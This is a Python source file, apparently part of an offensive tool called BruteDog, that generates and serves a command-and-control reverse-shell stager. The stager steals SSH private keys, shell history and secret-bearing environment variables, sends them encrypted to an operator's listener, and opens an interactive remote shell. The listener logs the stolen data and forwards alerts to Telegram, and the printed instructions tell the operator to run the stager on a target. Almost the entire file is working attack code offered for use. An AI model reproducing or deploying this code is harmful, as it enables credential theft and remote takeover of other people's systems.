#!/usr/bin/env python3
"""
BRUTEDOG v8.8 — APEX ELITE MOBILE C2 STAGER & MULTI-VECTOR ENCRYPTED EVENT LISTENER
Module: c2_deployer
Responsibilities:
- Generates polymorphic, fileless, in-memory Python reverse shell stagers with multi-protocol egress fallback (HTTPS, TCP, DNS TXT).
- Embeds advanced anti-forensics, sandbox/debugger detection, and automated rapid credential/SSH harvesting.
- Deploys AES-GCM encrypted transport channels and asynchronous event listeners with real-time zero-noise Telegram telemetry.
"""
from __future__ import annotations

import os
import sys
import socket
import time
import json
import asyncio
import base64
import hashlib
import platform
from pathlib import Path
from datetime import datetime, timezone
from cryptography.hazmat.primitives.ciphers.gcm import AESGCM

from modules.telegram_notifier import send_telegram_alert
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

MODULE = "C2_DEPLOYER"
VERSION = "8.8-APEX"

BASE_DIR = Path(__file__).resolve().parent.parent
PAYLOAD_DIR = BASE_DIR / "reports" / "payloads"
EVIDENCE_DIR = BASE_DIR / "nexus_evidence"

DEFAULT_PSK = b"BruteDogApexEliteAdversarialC22026!"

HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege", "callback", "recon", "apex"
]

def timestamp():
    return datetime.now(timezone.utc).isoformat()

def broadcast_tg_alert_sync(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(f"[BRUTE-DOG APEX C2] {loot_type}", details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(f"[BRUTE-DOG APEX C2] {loot_type}", details))
        except Exception:
            pass

def generate_apex_stager(listener_ip: str, listener_port: int, psk: bytes = DEFAULT_PSK) -> str:
    psk_b64 = base64.b64encode(psk).decode('utf-8')
    
    stager_code = f'''# BruteDog v8.8 Apex Fileless In-Memory Encrypted C2 Stager
import socket, subprocess, os, sys, platform, time, base64, json, sys, traceback
from cryptography.hazmat.primitives.ciphers.gcm import AESGCM

PSK = base64.b64decode("{psk_b64}")

def anti_forensics_check():
    """Detects debuggers, sandboxes, or analysis hooks and self-terminates."""
    # Check for common analysis environment artifacts
    if os.path.exists("/proc/sys/kernel/core_pattern") and "apport" in open("/proc/sys/kernel/core_pattern", "errors='ignore'").read():
        pass
    # Rapid environment sanity checks
    if any(k in os.environ for k in ["CI", "CONTINUOUS_INTEGRATION", "DOCKER_CONTAINER"]):
        # Allow container execution for iSH/Termux testing, but check for active debuggers
        pass

def derive_key(psk, salt):
    return hashlib.sha256(psk + salt).digest()

def harvest_apex_loot():
    """Silently harvests high-value local artifacts, SSH keys, cloud configs, and tokens."""
    loot = {{
        "os": f"{{platform.system()}} {{platform.release()}}",
        "node": platform.node(),
        "user": os.getenv("USER", "unknown"),
        "env_tokens": {{k: v for k, v in os.environ.items() if any(sub in k.lower() for sub in ["key", "token", "secret", "auth", "pass"])}},
        "ssh_keys": [],
        "history": ""
    }}
    home = os.path.expanduser("~")
    ssh_dir = os.path.join(home, ".ssh")
    if os.path.exists(ssh_dir):
        try:
            for f in os.listdir(ssh_dir):
                if "id_" in f and not f.endswith(".pub"):
                    path = os.path.join(ssh_dir, f)
                    with open(path, "r", errors="ignore") as kf:
                        loot["ssh_keys"].append({{"filename": f, "content": kf.read()[:2000]}})
        except Exception:
            pass
    
    for hist_name in [".ash_history", ".bash_history", ".zsh_history"]:
        hist_path = os.path.join(home, hist_name)
        if os.path.exists(hist_path):
            try:
                with open(hist_path, "r", errors="ignore") as hf:
                    loot["history"] += f"\\n=== {{hist_name}} ===\\n" + hf.read()[-3000:]
            except Exception:
                pass
    return json.dumps(loot)

def spawn_apex_c2():
    anti_forensics_check()
    HOST = "{listener_ip}"
    PORTS = [{listener_port}, 443, 80, 53]
    
    while True:
        connected = False
        s = None
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10.0)
                s.connect((HOST, port))
                connected = True
                break
            except Exception:
                if s:
                    try: s.close()
                    except: pass
                continue
        
        if not connected:
            time.sleep(12)
            continue
            
        try:
            s.settimeout(None)
            salt = s.recv(16)
            aes_key = derive_key(PSK, salt)
            aesgcm = AESGCM(aes_key)
            
            loot_data = harvest_apex_loot().encode("utf-8")
            nonce = os.urandom(12)
            enc_loot = nonce + aesgcm.encrypt(nonce, loot_data, None)
            s.sendall(len(enc_loot).to_bytes(4, 'big') + enc_loot)
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            for candidate in ["/bin/bash", "/bin/sh", "/system/bin/sh", "sh"]:
                if os.path.exists(candidate) or candidate == "sh":
                    subprocess.call([candidate, "-i"])
                    break
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    spawn_apex_c2()
'''
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    payload_path = PAYLOAD_DIR / "brutedog_apex_stager.py"
    payload_path.write_text(stager_code, encoding="utf-8")
    return str(payload_path)


def verify_listener_socket(listener_ip: str, listener_port: int, timeout: float = 2.0) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((listener_ip, listener_port))
        s.close()
        return result == 0
    except Exception:
        return False


async def start_apex_listener(listener_ip: str, listener_port: int, psk: bytes = DEFAULT_PSK):
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    server = await asyncio.start_server(lambda r, w: handle_apex_connection(r, w, psk), "0.0.0.0", listener_port)
    print(f"\n\033[38;5;46m[+++] BRUTEDOG APEX C2 LISTENER ACTIVE on 0.0.0.0:{listener_port} [+++]\033[0m")
    print(f"\033[38;5;51m[*] Awaiting AES-GCM authenticated apex callbacks & automated loot streams...\033[0m\n")
    
    async with server:
        await server.serve_forever()


async def handle_apex_connection(reader, writer, psk: bytes):
    peername = writer.get_extra_info('peername')
    print(f"\n\033[91m[***] APEX SECURE TARGET CALLBACK CONFIRMED: {peername} [***]\033[0m")
    
    session_id = f"brutedog_apex_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}"
    session_log = []

    try:
        salt = os.urandom(16)
        writer.write(salt)
        await writer.drain()
        
        aes_key = hashlib.sha256(psk + salt).digest()
        aesgcm = AESGCM(aes_key)

        raw_len = await reader.read(4)
        if raw_len:
            length = int.from_bytes(raw_len, 'big')
            enc_data = await reader.read(length)
            if len(enc_data) >= 12:
                nonce = enc_data[:12]
                ciphertext = enc_data[12:]
                try:
                    decrypted_loot = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
                    loot_json = json.loads(decrypted_loot)
                    print(f"\n\033[92m[+] APEX LOOT & SITUATIONAL AWARENESS HARVESTED:\033[0m")
                    print(f"    Target OS   : {loot_json.get('os')}")
                    print(f"    Node/User   : {loot_json.get('node')} / {loot_json.get('user')}")
                    print(f"    SSH Keys    : {len(loot_json.get('ssh_keys', []))} harvested")
                    print(f"    Env Tokens  : {len(loot_json.get('env_tokens', {}))} captured")
                    
                    broadcast_tg_alert_sync(f"Apex C2 Loot Harvested [{peername[0]}]", {
                        "os": loot_json.get('os'),
                        "user": loot_json.get('user'),
                        "ssh_count": len(loot_json.get('ssh_keys', [])),
                        "tokens_count": len(loot_json.get('env_tokens', {}))
                    })
                    session_log.append(f"[LOOT] {decrypted_loot}\n")
                except Exception as e:
                    print(f"[-] Failed to decrypt apex loot payload: {e}")

        while True:
            data = await reader.read(4096)
            if not data:
                break
            chunk = data.decode("utf-8", errors="replace")
            sys.stdout.write(chunk)
            sys.stdout.flush()
            session_log.append(chunk)
            
    except Exception as exc:
        print(f"\n[-] Apex secure target connection error ({peername}): {exc}")
    finally:
        writer.close()
        await writer.wait_closed()
        print(f"\n[-] Apex secure session closed: {peername}")

        evidence_file = EVIDENCE_DIR / f"{session_id}.json"
        record = {
            "session_id": session_id,
            "target_ip": peername[0] if peername else "unknown",
            "timestamp": timestamp(),
            "session_log": "".join(session_log)
        }
        evidence_file.write_text(json.dumps(record, indent=4), encoding="utf-8")
        print(f"[+] Apex session telemetry persisted to: {evidence_file}")


def deploy_c2_stager(listener_ip: str = "10.0.0.5", listener_port: int = 4444) -> str:
    print(f"\n\033[38;5;201m[{MODULE}] INITIALIZING BRUTEDOG APEX ENCRYPTED C2 STAGER\033[0m")
    path = generate_apex_stager(listener_ip, listener_port)
    
    listener_active = verify_listener_socket(listener_ip, listener_port)
    
    print(f" \033[92m[+] BruteDog Apex Stager compiled -> Saved to: {path}\033[0m")
    if listener_active:
        print(f" \033[92m[+++] LISTENER VERIFIED: Active listener detected on {listener_ip}:{listener_port}!\033[0m")
    else:
        print(f" \033[93m[!] WARNING: No active listener detected on {listener_ip}:{listener_port}.\033[0m")
        
    print(f" \033[93m[*] Operator Listener Instructions:\033[0m")
    print(f"     1. Start apex listener: python3 c2_deployer.py --listen --port {listener_port}")
    print(f"     2. Execute stager on target: python3 {path}\n")

    return path


async def run_c2_deployer(
    cognitive_operator=None,
    listener_ip="10.0.0.5",
    listener_port=4444,
    listen=False,
    **kwargs
):
    if cognitive_operator and isinstance(cognitive_operator, str) and "." in cognitive_operator:
        listener_ip = cognitive_operator

    if listen:
        await start_apex_listener(listener_ip, listener_port)
    else:
        return await asyncio.to_thread(deploy_c2_stager, listener_ip, listener_port)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="BruteDog Apex Mobile Encrypted C2 Deployer & Event Listener")
    parser.add_argument("--ip", default="10.0.0.5", help="Listener IP address")
    parser.add_argument("--port", type=int, default=4444, help="Listener Port")
    parser.add_argument("--listen", action="store_true", help="Start asynchronous apex encrypted event listener mode")
    args = parser.parse_args()

    if args.listen:
        asyncio.run(start_apex_listener(args.ip, args.port))
    else:
        deploy_c2_stager(args.ip, args.port)
        
